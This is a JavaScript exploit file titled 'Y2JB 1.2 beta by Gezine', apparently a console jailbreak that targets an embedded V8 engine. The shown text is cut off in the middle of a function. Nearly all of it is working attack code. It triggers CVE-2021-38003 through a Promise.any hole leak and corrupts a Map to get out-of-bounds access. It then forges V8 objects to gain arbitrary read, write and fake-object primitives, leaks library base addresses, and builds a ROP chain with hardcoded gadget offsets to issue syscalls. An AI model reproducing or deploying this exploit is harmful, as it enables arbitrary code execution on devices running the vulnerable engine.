/*
    Copyright (C) 2025 Gezine
    
    This software may be modified and distributed under the terms
    of the MIT license.  See the LICENSE file for details.
*/

const version_string = "Y2JB 1.2 beta by Gezine";

let NETWORK_LOGGING = false;
let LOG_SERVER = 'http://192.168.1.180:8080/log';

// Global functions
let addrof;
let read64;
let write64;
let create_fakeobj;
let read8;
let write8;
let read16;
let write16;
let read32;
let write32;
let get_backing_store;
let malloc;
let write_string;
let alloc_string;
let pwn;
let get_bytecode_addr;
let call_rop;
let call;
let syscall;
let send_notification;
let sysctlbyname;
let get_fwversion;

// Global objects
let allocated_buffers = [];
let eboot_base = 0n;
let libc_base;
let return_value_addr;
let libkernel_base;
let syscall_wrapper;
let firmwareVersion;
let rop_chain;
let fake_bc;
let fake_frame;
let return_value_buf;
let saved_fp = 0x0n;

// File flags
let O_WRONLY = 0x1n;
let O_RDONLY = 0x0n;
let O_RDWR = 0x2n;

let SYSCALL = {
    read: 0x3n,
    write: 0x4n,
    open: 0x5n,
    close: 0x6n,
    getuid: 0x18n,
    getsockname: 0x20n,
    accept: 0x1en,
    socket: 0x61n,
    connect: 0x62n,
    bind: 0x68n,
    setsockopt: 0x69n,
    listen: 0x6an,
    getsockopt: 0x76n,
    sysctl: 0xcan,
    netgetiflist: 0x7dn,
};

let ROP = {
    get pop_rsp()             { return eboot_base + 0x49f7fn;   },
    get pop_rax()             { return eboot_base + 0x2d954n;   },
    get pop_rdi()             { return eboot_base + 0xb0ec5n;   },
    get pop_rsi()             { return eboot_base + 0xb8a81n;   },
    get pop_rdx()             { return eboot_base + 0xb692n;    },
    get pop_rcx()             { return eboot_base + 0x187da3n;  },
    get pop_r8()              { return eboot_base + 0x1a8ff9n;  },
    get pop_r9()              { return eboot_base + 0x1394e01n; },
    get pop_rbp()             { return eboot_base + 0x69n;      },
    get mov_qword_rdi_rax()   { return eboot_base + 0x49a77n;   },
    get mov_qword_rdi_rdx()   { return eboot_base + 0x3a3b95n;  },
    get mov_rax_0x200000000() { return eboot_base + 0x1283d40n; },
    get mov_rsp_rbp()         { return eboot_base + 0xb1424n;   },
    get ret()                 { return eboot_base + 0x32n;      },
};

async function checkLogServer() {
    try {
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Timeout')), 800)
        );
        
        const fetchPromise = fetch(LOG_SERVER, {
            method: 'POST',
            body: 'Log server check from Y2JB'
        });
        
        await Promise.race([fetchPromise, timeoutPromise]);
        
        NETWORK_LOGGING = true;
    } catch (e) {
        NETWORK_LOGGING = false;
    }
}

let outputElement = null;
// hack for scrolling messages
let maxLines = 56;
const fontSize = Math.floor(window.innerHeight / maxLines * 0.85);
const leftPadding = Math.floor(window.innerWidth * 0.005);
const topPadding = Math.floor(window.innerHeight * 0.005);

async function log(message) {
    if (!outputElement) {
        outputElement = document.getElementById('output');
        if (!outputElement) {
            outputElement = document.createElement('div');
            outputElement.id = 'output';
            document.body.appendChild(outputElement);
        }
        outputElement.style.paddingLeft = leftPadding + 'px';
        outputElement.style.paddingTop = topPadding + 'px'; 
    }
    
    const lines = message.split('\n').filter(line => line.length > 0);
    lines.forEach(line => {
        let lineDiv = document.createElement('div');
        lineDiv.textContent = line;
        lineDiv.style.fontSize = fontSize + 'px';
        
        outputElement.appendChild(lineDiv);
    });
    
    while (outputElement.children.length > maxLines) {
        outputElement.removeChild(outputElement.children[0]);
    }
    
    await new Promise(resolve => {
        requestAnimationFrame(() => {
            setTimeout(resolve, 1);
        });
    });
        
    if (NETWORK_LOGGING) {
        try {
            await fetch(LOG_SERVER, {
                method: 'POST',
                body: message,
            });
        } catch (e) { }
    }
}

function load_localscript(filename) {
    const script = document.createElement('script');
    script.src = filename;
    document.head.appendChild(script);
}

function toHex(num) {
    return '0x' + BigInt(num).toString(16).padStart(16, '0');
}

function trigger() {
    let v1;
    function f0(v4) {
        v4(() => { }, v5 => {
            v1 = v5.errors;
        });
    }
    f0.resolve = function (v6) {
        return v6;
    };
    let v3 = {
        then(v7, v8) {
            v8();
        }
    };
    Promise.any.call(f0, [v3]);
    return v1[1];
}

(async function() {
    try {
        await log(version_string);
        await log('Starting Exploit');
        
        gc();
        gc();
        
        // CVE-2021-38003
        // CVE-2022-4174 faster hole leak
        // https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
        let hole = trigger();
        
        for (let i = 0; i < 0x10; i++) {
            map1 = new Map();
            map1.set(1, 1);
            map1.set(hole, 1);
            map1.delete(hole);
            map1.delete(hole);
            map1.delete(1);
            oob_arr = new BigUint64Array([0x4141414141414141n]);
        }
        
        victim_arr = new BigUint64Array([0x4343434343434343n, 0x4343434343434343n]);
        obj_arr = [{}, {}];

        map1.set(0x1e, -1);
        gc();
        map1.set(0x0, 0x1);
        
        //oob_arr[31] : 0x2 -- victim_arr length
        //oob_arr[32] : 0xf -- victim_arr ExternalPointer_t 
        //oob_arr[33] : 0x27e8412d1 -- victm_arr base_pointer
        
        await log ("oob_arr length : " + toHex(oob_arr.length));
        
        const oob_arr_before = [];
        for (let i = 0; i < 100; i++) {
            oob_arr_before[i] = oob_arr[i];
        }
        
        obj_arr[0] = 0x1n;

        let obj_arr_offset = -1;
        for (let i = 0; i < 100; i++) {
            if (oob_arr[i] !== oob_arr_before[i]) {
                obj_arr_offset = i;
                break;
            }
        }

        //await log('obj_arr_offset : ' + obj_arr_offset);
        
        if (obj_arr_offset === -1) {
            throw new Error("Failed to get unstable primitive");
        }
        
        await log("Unstable primitive achieved");
        
        function addrof_unstable(obj) {
            const obj_arr_org_value = oob_arr[obj_arr_offset];
            obj_arr[0] = obj;
            const addr = oob_arr[obj_arr_offset] - 1n;
            oob_arr[obj_arr_offset] = obj_arr_org_value;
            return addr;
        }
        
        function read64_unstable(addr) {
            const victim_arr_org_base = oob_arr[33];
            oob_arr[33] = addr - 0xfn;
            const value = victim_arr[0];
            oob_arr[33] = victim_arr_org_base;
            return value;
        }
        
        function write64_unstable(addr, value) {
            const victim_arr_org_base = oob_arr[33];
            oob_arr[33] = addr - 0xfn;
            victim_arr[0] = value;
            oob_arr[33] = victim_arr_org_base;
        }
        
        function create_fakeobj_unstable(addr) {
            const obj_arr_org_value = oob_arr[obj_arr_offset];
            oob_arr[obj_arr_offset] = addr + 1n;
            const fake_obj = obj_arr[0];
            oob_arr[obj_arr_offset] = obj_arr_org_value;
            return fake_obj;
        }                
        
        // Allocate Large Object Space with proper page metadata
        // Create object array first to initialize page structures
        const stable_array = new Array(0x10000);
        for (let i = 0; i < stable_array.length; i++) {
            stable_array[i] = {};
        }
                        
        // Get FixedDoubleArray map from a template
        const double_template = new Array(0x10);
        double_template.fill(3.14);
        const double_template_addr = addrof_unstable(double_template);
        const double_elements_addr = read64_unstable(double_template_addr + 0x10n) - 1n;
        const fixed_double_array_map = read64_unstable(double_elements_addr + 0x00n);
        
        // Get stable_array addresses
        const stable_array_addr = addrof_unstable(stable_array);
        const stable_elements_addr = read64_unstable(stable_array_addr + 0x10n) - 1n;
        
        // Transform elements to FixedDoubleArray
        // This makes GC happy later
        write64_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);
        
        // Get templates for large external storage arrays
        const template_biguint = new BigUint64Array(64);
        const template_biguint_addr = addrof_unstable(template_biguint);
        const template_biguint_elements = read64_unstable(template_biguint_addr + 0x10n) - 1n;
        
        const biguint_map = read64_unstable(template_biguint_addr + 0x00n);
        const biguint_props = read64_unstable(template_biguint_addr + 0x08n);
        const biguint_elem_map = read64_unstable(template_biguint_elements + 0x00n);
        const biguint_elem_len = read64_unstable(template_biguint_elements + 0x08n);
        
        // Get template for small inline storage arrays
        const template_small = new BigUint64Array(8);
        const template_small_addr = addrof_unstable(template_small);
        const template_small_buffer_addr = read64_unstable(template_small_addr + 0x18n) - 1n;
        const template_small_elements_addr = read64_unstable(template_small_addr + 0x10n) - 1n;
        
        const small_map = read64_unstable(template_small_addr + 0x00n);
        const small_props = read64_unstable(template_small_addr + 0x08n);
        const small_elem_map = read64_unstable(template_small_elements_addr + 0x00n);
        const small_elem_length_field = read64_unstable(template_small_elements_addr + 0x08n);
        
        const small_buffer_map = read64_unstable(template_small_buffer_addr + 0x00n);
        const small_buffer_props = read64_unstable(template_small_buffer_addr + 0x08n);
        const small_buffer_elements = read64_unstable(template_small_buffer_addr + 0x10n);
        const small_buffer_bit_field = read64_unstable(template_small_buffer_addr + 0x30n);
        
        // Get template for ArrayBuffer
        const template_buffer = new ArrayBuffer(1024);
        const template_buffer_addr = addrof_unstable(template_buffer);
        const template_buffer_elements = read64_unstable(template_buffer_addr + 0x10n) - 1n;
        
        const buffer_map = read64_unstable(template_buffer_addr + 0x00n);
        const buffer_props = read64_unstable(template_buffer_addr + 0x08n);
        const buffer_elem_map = read64_unstable(template_buffer_elements + 0x00n);
        const buffer_elem_len = read64_unstable(template_buffer_elements + 0x08n);
        
        // Get template for Array object
        const template_array = [{}, {}];
        const template_array_addr = addrof_unstable(template_array);
        const template_array_elements_addr = read64_unstable(template_array_addr + 0x10n) - 1n;
        
        const array_map = read64_unstable(template_array_addr + 0x00n);
        const array_props = read64_unstable(template_array_addr + 0x08n);
        const array_elem_map = read64_unstable(template_array_elements_addr + 0x00n);
        
        // Get template for double object
        const heap_number = 1.1;
        const heap_number_addr = addrof_unstable(heap_number);
        const heap_number_map = read64_unstable(heap_number_addr);
        
        const base = stable_elements_addr + 0x2000n;
        
        // Main data region that fake_rw will read/write
        const fake_rw_data = base + 0x0000n;
        
        // Inside fake_rw_data: fake Array's elements (at the beginning)
        const fake_array_elements_data = fake_rw_data + 0x0000n;
        // Structure: +0x00: map, +0x08: length, +0x10: slot[0], +0x18: slot[1], ...
        
        const fake_arr2_obj = base + 0x0100n;
        const fake_arr2_elements = base + 0x0150n;
        const fake_rw2_data = base + 0x0200n;
        
        // +0x00: ArrayBuffer (0x38 bytes)
        // +0x48: Elements FixedArray (0x10 bytes header)
        // +0x58: Data (64 bytes for 8 uint64s)
        // +0x98: BigUint64Array object (0x48 bytes)
        
        const fake_bc_base = base + 0x0400n;
        const fake_bc_buffer = fake_bc_base + 0x00n;
        const fake_bc_elements = fake_bc_base + 0x48n;
        const fake_bc_data = fake_bc_base + 0x58n;
        const fake_bc_obj = fake_bc_base + 0x98n;
        
        const fake_frame_base = base + 0x0600n;
        const fake_frame_buffer = fake_frame_base + 0x00n;
        const fake_frame_elements = fake_frame_base + 0x48n;
        const fake_frame_data = fake_frame_base + 0x58n;
        const fake_frame_obj = fake_frame_base + 0x98n;
        
        const fake_buffer_rw2_obj = base + 0x0800n;
        const fake_buffer_rw2_elements = base + 0x0850n;
        
        // Objects outside fake_rw accessible range
        const fake_buffer_rw_obj = base + 0x1000n;
        const fake_buffer_rw_elements = base + 0x1050n;
        const fake_array_obj = base + 0x1100n;
        const fake_rw_obj = base + 0x1200n;
        const fake_rw_elements = base + 0x1250n;
        
        // ROP chain with external storage
        const fake_rop_chain_data = base + 0x2000n;
        const fake_rop_chain_buffer_obj = base + 0x3000n;
        const fake_rop_chain_buffer_elements = base + 0x3050n;
        const fake_rop_chain_obj = base + 0x3100n;
        const fake_rop_chain_elements = base + 0x3150n;
        
        // return_value_buf with inline storage
        const fake_return_value_elements = base + 0x4000n;
        const fake_return_value_buffer_obj = base + 0x4100n;
        const fake_return_value_buffer_elements = base + 0x4150n;
        const fake_return_value_obj = base + 0x4200n;
        
        // Create fake Array elements inside fake_rw_data region
        // FixedArray: map + length + data slots
        write64_unstable(fake_array_elements_data + 0x00n, array_elem_map);
        write64_unstable(fake_array_elements_data + 0x08n, 0x0000001000000000n);  // length = 16 slots (Smi)
        
        for (let i = 0n; i < 16n; i++) {
            write64_unstable(fake_array_elements_data + 0x10n + i * 8n, 0n);
        }
        
        // Create fake Array object pointing to elements inside fake_rw_data
        write64_unstable(fake_array_obj + 0x00n, array_map);
        write64_unstable(fake_array_obj + 0x08n, array_props);
        write64_unstable(fake_array_obj + 0x10n, fake_array_elements_data + 1n);  // elements (tagged)
        write64_unstable(fake_array_obj + 0x18n, 0x0000001000000000n);  // length = 16 (Smi)
        
        // Create fake ArrayBuffer #1 elements
        write64_unstable(fake_buffer_rw_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_buffer_rw_elements + 0x08n, buffer_elem_len);
        
        // Create fake ArrayBuffer #1 (buffer_rw)
        write64_unstable(fake_buffer_rw_obj + 0x00n, buffer_map);
        write64_unstable(fake_buffer_rw_obj + 0x08n, buffer_props);
        write64_unstable(fake_buffer_rw_obj + 0x10n, fake_buffer_rw_elements + 1n);
        write64_unstable(fake_buffer_rw_obj + 0x18n, 0x1000n);  // byte_length
        write64_unstable(fake_buffer_rw_obj + 0x20n, fake_rw_data);  // backing_store
        write64_unstable(fake_buffer_rw_obj + 0x28n, 0n);  // extension
        write64_unstable(fake_buffer_rw_obj + 0x30n, 0n);  // bit_field
        
        // Create fake ArrayBuffer #2 elements
        write64_unstable(fake_buffer_rw2_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_buffer_rw2_elements + 0x08n, buffer_elem_len);
        
        // Create fake ArrayBuffer #2 (buffer_rw2)
        write64_unstable(fake_buffer_rw2_obj + 0x00n, buffer_map);
        write64_unstable(fake_buffer_rw2_obj + 0x08n, buffer_props);
        write64_unstable(fake_buffer_rw2_obj + 0x10n, fake_buffer_rw2_elements + 1n);
        write64_unstable(fake_buffer_rw2_obj + 0x18n, 0x200n);  // byte_length
        write64_unstable(fake_buffer_rw2_obj + 0x20n, fake_rw2_data);  // backing_store
        write64_unstable(fake_buffer_rw2_obj + 0x28n, 0n);  // extension
        write64_unstable(fake_buffer_rw2_obj + 0x30n, 0n);  // bit_field
        
        // Create fake BigUint64Array #2 elements
        write64_unstable(fake_arr2_elements + 0x00n, biguint_elem_map);
        write64_unstable(fake_arr2_elements + 0x08n, biguint_elem_len);
        
        // Create fake BigUint64Array #2 (fake_arr2)
        write64_unstable(fake_arr2_obj + 0x00n, biguint_map);
        write64_unstable(fake_arr2_obj + 0x08n, biguint_props);
        write64_unstable(fake_arr2_obj + 0x10n, fake_arr2_elements + 1n);
        write64_unstable(fake_arr2_obj + 0x18n, fake_buffer_rw2_obj + 1n);
        write64_unstable(fake_arr2_obj + 0x20n, 0n);  // byte_offset
        write64_unstable(fake_arr2_obj + 0x28n, 0x200n);  // byte_length
        write64_unstable(fake_arr2_obj + 0x30n, 0x40n);  // length
        write64_unstable(fake_arr2_obj + 0x38n, fake_rw2_data);  // external_pointer
        write64_unstable(fake_arr2_obj + 0x40n, 0n);  // base_pointer
        
        // Create fake BigUint64Array #1 elements
        write64_unstable(fake_rw_elements + 0x00n, biguint_elem_map);
        write64_unstable(fake_rw_elements + 0x08n, biguint_elem_len);
        
        // Create fake BigUint64Array #1 (fake_rw) - overlaps with fake_rw_data
        write64_unstable(fake_rw_obj + 0x00n, biguint_map);
        write64_unstable(fake_rw_obj + 0x08n, biguint_props);
        write64_unstable(fake_rw_obj + 0x10n, fake_rw_elements + 1n);
        write64_unstable(fake_rw_obj + 0x18n, fake_buffer_rw_obj + 1n);
        write64_unstable(fake_rw_obj + 0x20n, 0n);  // byte_offset
        write64_unstable(fake_rw_obj + 0x28n, 0x1000n);  // byte_length
        write64_unstable(fake_rw_obj + 0x30n, 0x200n);  // length (increased to 512)
        write64_unstable(fake_rw_obj + 0x38n, fake_rw_data);  // external_pointer
        write64_unstable(fake_rw_obj + 0x40n, 0n);  // base_pointer
        
        // ArrayBuffer (0x00 - 0x37)
        write64_unstable(fake_bc_buffer + 0x00n, small_buffer_map);
        write64_unstable(fake_bc_buffer + 0x08n, small_buffer_props);
        write64_unstable(fake_bc_buffer + 0x10n, small_buffer_elements);
        write64_unstable(fake_bc_buffer + 0x18n, 0x40n);  // byte_length
        write64_unstable(fake_bc_buffer + 0x20n, 0n);     // backing_store = NULL
        write64_unstable(fake_bc_buffer + 0x28n, 0n);     // extension
        write64_unstable(fake_bc_buffer + 0x30n, small_buffer_bit_field);
        
        // Padding (0x38 - 0x47) - 16 bytes of zeros
        write64_unstable(fake_bc_buffer + 0x38n, 0n);
        write64_unstable(fake_bc_buffer + 0x40n, 0n);
        
        // Elements (0x48 - 0x57)
        write64_unstable(fake_bc_elements + 0x00n, small_elem_map);
        write64_unstable(fake_bc_elements + 0x08n, small_elem_length_field);
        
        // BigUint64Array object (0x98 - 0xDF)
        write64_unstable(fake_bc_obj + 0x00n, small_map);
        write64_unstable(fake_bc_obj + 0x08n, small_props);
        write64_unstable(fake_bc_obj + 0x10n, fake_bc_elements + 1n);  // elements (tagged)
        write64_unstable(fake_bc_obj + 0x18n, fake_bc_buffer + 1n);    // buffer (tagged)
        write64_unstable(fake_bc_obj + 0x20n, 0n);     // byte_offset
        write64_unstable(fake_bc_obj + 0x28n, 0x40n);  // byte_length = 64
        write64_unstable(fake_bc_obj + 0x30n, 0x8n);   // length = 8
        write64_unstable(fake_bc_obj + 0x38n, 0xfn);   // external_ptr = 15
        write64_unstable(fake_bc_obj + 0x40n, fake_bc_elements + 1n);  // base_pointer (tagged)
        
        write64_unstable(fake_frame_buffer + 0x00n, small_buffer_map);
        write64_unstable(fake_frame_buffer + 0x08n, small_buffer_props);
        write64_unstable(fake_frame_buffer + 0x10n, small_buffer_elements);
        write64_unstable(fake_frame_buffer + 0x18n, 0x40n);
        write64_unstable(fake_frame_buffer + 0x20n, 0n);
        write64_unstable(fake_frame_buffer + 0x28n, 0n);
        write64_unstable(fake_frame_buffer + 0x30n, small_buffer_bit_field);
        
        write64_unstable(fake_frame_buffer + 0x38n, 0n);  // Padding ?
        write64_unstable(fake_frame_buffer + 0x40n, 0n);  // Padding
        
        write64_unstable(fake_frame_elements + 0x00n, small_elem_map);
        write64_unstable(fake_frame_elements + 0x08n, small_elem_length_field);
        
        // This looks like BigUint64Array but it is NOT!!!!
        // Using BigUint64Array for fake frame makes GC angry
        // Instead use double object
        // But I will leave BigUint64Array struct except map
        // So I can keep use the existing ROP code
        write64_unstable(fake_frame_obj + 0x00n, heap_number_map);
        write64_unstable(fake_frame_obj + 0x08n, small_props);
        write64_unstable(fake_frame_obj + 0x10n, fake_frame_elements + 1n);
        write64_unstable(fake_frame_obj + 0x18n, fake_frame_buffer + 1n);
        write64_unstable(fake_frame_obj + 0x20n, 0n);
        write64_unstable(fake_frame_obj + 0x28n, 0x40n);
        write64_unstable(fake_frame_obj + 0x30n, 0x8n);
        write64_unstable(fake_frame_obj + 0x38n, 0xfn);
        write64_unstable(fake_frame_obj + 0x40n, fake_frame_elements + 1n);
        
        for (let i = 0n; i < 0x40n; i += 8n) {
            write64_unstable(fake_bc_data + i, 0n);
            write64_unstable(fake_frame_data + i, 0n);
        }
        
        // Create fake rop_chain elements
        write64_unstable(fake_rop_chain_elements + 0x00n, biguint_elem_map);
        write64_unstable(fake_rop_chain_elements + 0x08n, biguint_elem_len);
        
        // Create fake rop_chain ArrayBuffer elements
        write64_unstable(fake_rop_chain_buffer_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_rop_chain_buffer_elements + 0x08n, buffer_elem_len);
        
        // Create fake rop_chain ArrayBuffer
        write64_unstable(fake_rop_chain_buffer_obj + 0x00n, buffer_map);
        write64_unstable(fake_rop_chain_buffer_obj + 0x08n, buffer_props);
        write64_unstable(fake_rop_chain_buffer_obj + 0x10n, fake_rop_chain_buffer_elements + 1n);
        write64_unstable(fake_rop_chain_buffer_obj + 0x18n, 0x800n);  // byte_length
        write64_unstable(fake_rop_chain_buffer_obj + 0x20n, fake_rop_chain_data);  // backing_store
        write64_unstable(fake_rop_chain_buffer_obj + 0x28n, 0n);  // extension
        write64_unstable(fake_rop_chain_buffer_obj + 0x30n, 0n);  // bit_field
        
        // Create fake rop_chain BigUint64Array (external storage)
        write64_unstable(fake_rop_chain_obj + 0x00n, biguint_map);
        write64_unstable(fake_rop_chain_obj + 0x08n, biguint_props);
        write64_unstable(fake_rop_chain_obj + 0x10n, fake_rop_chain_elements + 1n);
        write64_unstable(fake_rop_chain_obj + 0x18n, fake_rop_chain_buffer_obj + 1n);
        write64_unstable(fake_rop_chain_obj + 0x20n, 0n);  // byte_offset
        write64_unstable(fake_rop_chain_obj + 0x28n, 0x800n);  // byte_length
        write64_unstable(fake_rop_chain_obj + 0x30n, 0x100n);  // length
        write64_unstable(fake_rop_chain_obj + 0x38n, fake_rop_chain_data);  // external_pointer
        write64_unstable(fake_rop_chain_obj + 0x40n, 0n);  // base_pointer
        
        // Create fake return_value_buf elements (inline storage)
        write64_unstable(fake_return_value_elements + 0x00n, small_elem_map);
        write64_unstable(fake_return_value_elements + 0x08n, small_elem_length_field);
        
        // Create fake return_value_buf ArrayBuffer elements
        write64_unstable(fake_return_value_buffer_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_return_value_buffer_elements + 0x08n, buffer_elem_len);
        
        // Create fake return_value_buf ArrayBuffer
        write64_unstable(fake_return_value_buffer_obj + 0x00n, small_buffer_map);
        write64_unstable(fake_return_value_buffer_obj + 0x08n, small_buffer_props);
        write64_unstable(fake_return_value_buffer_obj + 0x10n, small_buffer_elements);
        write64_unstable(fake_return_value_buffer_obj + 0x18n, 0x40n);  // byte_length
        write64_unstable(fake_return_value_buffer_obj + 0x20n, 0n);  // backing_store = null
        write64_unstable(fake_return_value_buffer_obj + 0x28n, 0n);  // extension
        write64_unstable(fake_return_value_buffer_obj + 0x30n, small_buffer_bit_field);
        
        // Create fake return_value_buf BigUint64Array (inline storage)
        write64_unstable(fake_return_value_obj + 0x00n, small_map);
        write64_unstable(fake_return_value_obj + 0x08n, small_props);
        write64_unstable(fake_return_value_obj + 0x10n, fake_return_value_elements + 1n);
        write64_unstable(fake_return_value_obj + 0x18n, fake_return_value_buffer_obj + 1n);
        write64_unstable(fake_return_value_obj + 0x20n, 0n);  // byte_offset
        write64_unstable(fake_return_value_obj + 0x28n, 0x40n);  // byte_length
        write64_unstable(fake_return_value_obj + 0x30n, 0x8n);  // length
        write64_unstable(fake_return_value_obj + 0x38n, 0xfn);  // external_pointer
        write64_unstable(fake_return_value_obj + 0x40n, fake_return_value_elements + 1n);  // base_pointer
        
        // Materialize fake objects
        const fake_rw = create_fakeobj_unstable(fake_rw_obj);
        const fake_arr2 = create_fakeobj_unstable(fake_arr2_obj);
        const fake_array = create_fakeobj_unstable(fake_array_obj);
        
        // Calculate offsets for accessing via fake_rw
        const arr2_external_offset = Number((fake_arr2_obj + 0x38n - fake_rw_data) / 8n);
        const fake_array_slot0_offset = Number((fake_array_elements_data + 0x10n - fake_rw_data) / 8n);
        
        // Stable primitives
        addrof = function(obj) {
            const arr_elements_org = fake_rw[fake_array_slot0_offset];
            fake_array[0] = obj;
            const addr = fake_rw[fake_array_slot0_offset] - 1n;
            fake_rw[fake_array_slot0_offset] = arr_elements_org;
            return addr;
        }
        
        read64 = function(addr) {
            const arr2_external_org = fake_rw[arr2_external_offset];
            fake_rw[arr2_external_offset] = addr;
            const value = fake_arr2[0];
            fake_rw[arr2_external_offset] = arr2_external_org;
            return value;
        }
        
        write64 = function(addr, value) {
            const arr2_external_org = fake_rw[arr2_external_offset];
            fake_rw[arr2_external_offset] = addr;
            fake_arr2[0] = value;
            fake_rw[arr2_external_offset] = arr2_external_org;
        }
        
        create_fakeobj = function(addr) {
            const arr_elements_org = fake_rw[fake_array_slot0_offset];
            fake_rw[fake_array_slot0_offset] = addr + 1n;
            const fake_obj = fake_array[0];
            fake_rw[fake_array_slot0_offset] = arr_elements_org;
            return fake_obj;
        }                

        read8 = function(addr) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            return (qword >> BigInt(byte_offset * 8)) & 0xFFn;
        }

        write8 = function(addr, value) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            const mask = 0xFFn << BigInt(byte_offset * 8);
            const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFn) << BigInt(byte_offset * 8));
            write64(addr & ~7n, new_qword);
        }

        read16 = function(addr) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            return (qword >> BigInt(byte_offset * 8)) & 0xFFFFn;
        }
        
        write16 = function(addr, value) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            const mask = 0xFFFFn << BigInt(byte_offset * 8);
            const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFFFn) << BigInt(byte_offset * 8));
            write64(addr & ~7n, new_qword);
        }
        
        read32 = function(addr) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            return (qword >> BigInt(byte_offset * 8)) & 0xFFFFFFFFn;
        }

        write32 = function(addr, value) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            const mask = 0xFFFFFFFFn << BigInt(byte_offset * 8);
            const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFFFFFFFn) << BigInt(byte_offset * 8));
            write64(addr & ~7n, new_qword);
        }
        
        get_backing_store = function(typed_array) {
            const obj_addr = addrof(typed_array);
            const external = read64(obj_addr + 0x38n);
            const base = read64(obj_addr + 0x40n);
            return base + external;
        }
        
        malloc = function(size) {
            const buffer = new ArrayBuffer(size);
            const buffer_addr = addrof(buffer);
            const backing_store = read64(buffer_addr + 0x20n);
            allocated_buffers.push(buffer);
            return backing_store;
        }
        
        // Write UTF-8 string to existing buffer
        write_string = function(addr, str) {
            const encoder = new TextEncoder();
            const bytes = encoder.encode(str);
            
            for (let i = 0; i < bytes.length; i++) {
                write8(addr + BigInt(i), bytes[i]);
            }
            
            write8(addr + BigInt(bytes.length), 0);
        }
        
        alloc_string = function(str) {
            const encoder = new TextEncoder();
            const bytes = encoder.encode(str);
            const addr = malloc(bytes.length + 1);
            
            for (let i = 0; i < bytes.length; i++) {
                write8(addr + BigInt(i), bytes[i]);
            }
            
            write8(addr + BigInt(bytes.length), 0);
            
            return addr;
        }
        
        await log("Stable primitive achieved");
        
        await log("Setting up ROP...");
        
        // https://github.com/google/google-ctf/tree/main/2023/quals/sandbox-v8box/solution
        // We don't have pointer compression
        
        // Make bytecode larger and just use it's address
        // No separate fake bytecode buffer
        pwn = function(x) {
            let dummy1 = x + 1;
            let dummy2 = x + 2;
            let dummy3 = x + 3;
            let dummy4 = x + 4;
            let dummy5 = x + 5;
            return x;
        }
        
        pwn(1); // Generate bytecode
        
        get_bytecode_addr = function() {
            const pwn_addr = addrof(pwn); // JSFunction
            const sfi_addr = read64(pwn_addr + 0x18n) - 1n; // SharedFunctionInfo
            const bytecode_addr = read64(sfi_addr + 0x8n) - 1n; // BytecodeArray
            return bytecode_addr;
        }
        
        rop_chain = create_fakeobj(fake_rop_chain_obj);
        fake_bc = create_fakeobj(fake_bc_obj);
        fake_frame = create_fakeobj(fake_frame_obj);
        return_value_buf = create_fakeobj(fake_return_value_obj);
        
        //await log("fake_bc @ " + toHex(addrof(fake_bc)));
        //await log("fake_frame @ " + toHex(addrof(fake_frame)));
        
        const bytecode_addr = get_bytecode_addr();
        //await log("BytecodeArray @ " + toHex(bytecode_addr));
        
        bc_start = bytecode_addr + 0x36n;
        write64(bc_start, 0xAB0025n);
        
        const stack_addr = addrof(pwn(1)) + 0x1n;
        await log("Stack leak @ " + toHex(stack_addr));
        
        eboot_base = read64(stack_addr + 0x8n) - 0xFBC81Fn;
        await log("eboot_base @ " + toHex(eboot_base));
        
        libc_base = read64(eboot_base + 0x2A66660n) - 0x851A0n;
        await log("libc_base @ " + toHex(libc_base));
        
        const rop_chain_addr = get_backing_store(rop_chain);
        //await log("ROP chain @ " + toHex(rop_chain_addr));
        
        // Fake bytecode for r14 register
        fake_bc[0] = 0xABn; // Return opcode - keeps interpreter happy
        const fake_bc_addr = get_backing_store(fake_bc);
        //await log("Fake bytecode @ " + toHex(fake_bc_addr));
        
        const fake_frame_backing = get_backing_store(fake_frame);
        
        // This sets the r14 register which V8 expects to point to bytecode
        write64(fake_frame_backing + 0x21n, fake_bc_addr);
        
        return_value_addr = get_backing_store(return_value_buf);
        //await log("return_value_addr @ " + toHex(return_value_addr));

        const fake_frame_addr = addrof(fake_frame);
        // Pivot RSP
        write64(fake_frame_addr + 0x09n, ROP.pop_rsp); // pop rsp ; ret
        write64(fake_frame_addr + 0x11n, rop_chain_addr);

        call_rop = function(address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            let rop_i = 0;
            
            // Syscall number
            rop_chain[rop_i++] = ROP.pop_rax; // pop rax ; ret
            rop_chain[rop_i++] = rax;
            
            // Setup arguments
            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
            rop_chain[rop_i++] = arg1;
            rop_chain[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
            rop_chain[rop_i++] = arg2;
            rop_chain[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
            rop_chain[rop_i++] = arg3;
            rop_chain[rop_i++] = ROP.pop_rcx; // pop rcx ; ret
            rop_chain[rop_i++] = arg4;
            rop_chain[rop_i++] = ROP.pop_r8; // pop r8 ; ret
            rop_chain[rop_i++] = arg5;
            rop_chain[rop_i++] = ROP.pop_r9; // pop r9 ; ret
            rop_chain[rop_i++] = arg6;

            // Call function
            rop_chain[rop_i++] = address; 
            
            // Store return value to return_value_addr
            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
            rop_chain[rop_i++] = return_value_addr;
            rop_chain[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
            
            // Return safe tagged value to JavaScript
            rop_chain[rop_i++] = ROP.mov_rax_0x200000000; // mov rax, 0x200000000 ; ret

